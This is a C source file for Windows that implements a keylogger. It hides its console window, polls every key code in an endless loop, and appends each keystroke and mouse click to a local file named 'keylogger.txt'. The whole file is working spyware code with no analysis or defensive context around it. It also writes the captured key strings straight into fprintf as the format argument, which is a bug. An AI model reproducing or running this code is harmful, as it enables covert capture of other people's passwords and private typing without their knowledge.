#include <stdio.h>
#include <string.h>
 

#include <windows.h>

#define FILE_NAME "keylogger.txt"


//
int take_n_run ( int key );
 

int hideConsole ( void );
 
#define _MAX_CHAR 3

void savePressedKey(char pressedKey[], char fileName[]) ;

int main ( void )
{
 
	        //   Sleep(100);
		//printf("%sdsfs\n");
		register short i;
		//char * data = ( char * ) calloc ( _MAX_CHAR + 12, sizeof ( char ) ); 
		//protectProcess ( );
		

		hideConsole();
	 //Sleep(10000);

 		while ( 1 ) {
			
				for ( i = 1 ; i <=255 ; i++ )
				{
					if ( GetAsyncKeyState ( i ) == -32767 ) {
						
						take_n_run (i);
							//printf("%s\n",data);
							//printf("%d\n",i);
							
					}
				}
			Sleep(200);
		
			
               
		
           
	}

	
	return 0;
}
 


void savePressedKey(char pressedKey[], char fileName[]) {

    FILE *file = fopen(fileName, "a+");

    fprintf(file,pressedKey);
    fclose(file);
}



int take_n_run ( int key )
{
	switch ( key ) {
		case 48 :
			savePressedKey("0", FILE_NAME);
			//savePressedKey("0" );
			//printf("%s",buffer);
			return 0;
		case 49 :
			savePressedKey("1", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 50 :
			savePressedKey("2", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 51 :
			savePressedKey("3", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 52 :
			savePressedKey("4", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 53 :
			savePressedKey("5", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 54 :
			savePressedKey("6", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 55 :
			savePressedKey("7", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 56 :
			savePressedKey("8", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 57 :
			savePressedKey("9", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 65 :
			savePressedKey("a", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 66 :
			savePressedKey("b", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 67 :
			savePressedKey("c", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 68 :
			savePressedKey("d", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 69 :
			savePressedKey("e", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 70 :
			savePressedKey("f", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 71 :
			savePressedKey("g", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 72 :
			savePressedKey("h", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 73 :
			savePressedKey("i", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 74 :
			savePressedKey("j", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 75 :
			savePressedKey("k" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 76 :
			savePressedKey("l" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 77 :
			savePressedKey("m" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 78 :
			savePressedKey("n" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 79 :
			savePressedKey("o", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 80 :
			savePressedKey("p" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 81 :
			savePressedKey("q" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 82 :
			savePressedKey("r", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 83 :
			savePressedKey("s" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 84 :
			savePressedKey("t", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 85 :
			savePressedKey("u", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 86 :
			savePressedKey("v" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 87 :
			savePressedKey("w", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 88 :
			savePressedKey("x" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 89 :
			savePressedKey("y" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 90 :
			savePressedKey("z" , FILE_NAME);
			//printf("%s",buffer);
			return 0;


//___________________________
		case 96 :
			savePressedKey("0", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 97 :
			savePressedKey("1" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 98 :
			savePressedKey("2", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 99 :
			savePressedKey("3" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 100 :
			savePressedKey("4", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 101 :
			savePressedKey("5", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 102 :
			savePressedKey("6" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 103 :
			savePressedKey("7" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 104 :
			savePressedKey("8" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 105 :
			savePressedKey("9" , FILE_NAME);
			//printf("%s",buffer);
			return 0;


		case 106 :
			savePressedKey("*", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 107 :
			savePressedKey("+" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 109 :
			savePressedKey("-" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 110 :
			savePressedKey("." , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 111 :
			savePressedKey("/" , FILE_NAME);
			//printf("%s",buffer);
			return 0;


//__________________
		case 186 :
			savePressedKey(";" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 187 :
			savePressedKey("=" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 188 :
			savePressedKey("," , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 189 :
			savePressedKey("-" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 190 :
			savePressedKey("." , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 191 :
			savePressedKey("/" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 192 :
			savePressedKey("`" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 219 :
			savePressedKey("[" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 220 :
			savePressedKey("\\", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 221 :
			savePressedKey(" ]", FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 222 :
			savePressedKey("'" , FILE_NAME);
			//printf("%s",buffer);
			return 0;
		case 13 :
			savePressedKey("\n" , FILE_NAME);
			return 0;
		case 32 :
			savePressedKey(" " , FILE_NAME);
			return 0;
		case VK_TAB :
			savePressedKey("[T]" , FILE_NAME);
			return 0;
		case VK_SHIFT :
			savePressedKey("[S]" , FILE_NAME);
			return 0;
		case VK_CONTROL :
			savePressedKey("[C]" , FILE_NAME);
			return 0;		
		case VK_ESCAPE :
			savePressedKey("[ES]" , FILE_NAME);
			return 0;
		case VK_END :
			savePressedKey("[EN]", FILE_NAME);
			return 0;
		case VK_HOME :
			savePressedKey("[H]", FILE_NAME);
			return 0;
		case VK_LEFT :
			savePressedKey("[L]" , FILE_NAME);
			return 0;
		case VK_RIGHT :
			savePressedKey("[R]", FILE_NAME);
			return 0;
		case VK_UP :
			savePressedKey("[U]" , FILE_NAME);
			return 0;
		case VK_DOWN :
			savePressedKey("[D]" , FILE_NAME);
			return 0;
		case VK_BACK :
			savePressedKey("[BC]", FILE_NAME);
			return 0;
		case VK_CAPITAL:
			savePressedKey("[CL]", FILE_NAME);
			return 0;
		case VK_LBUTTON:
			savePressedKey("[LBUTTON]", FILE_NAME);
			return 0;
		case VK_RBUTTON:
			savePressedKey("[RBUTTON]", FILE_NAME);
			return 0;	
		
	}
    return 0;
}
 
#define CONSOLE_NAME "Secure"
 
int hideConsole ( void )
{
  

HWND hWnd = GetConsoleWindow();
   // ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );

return 0;
}
 
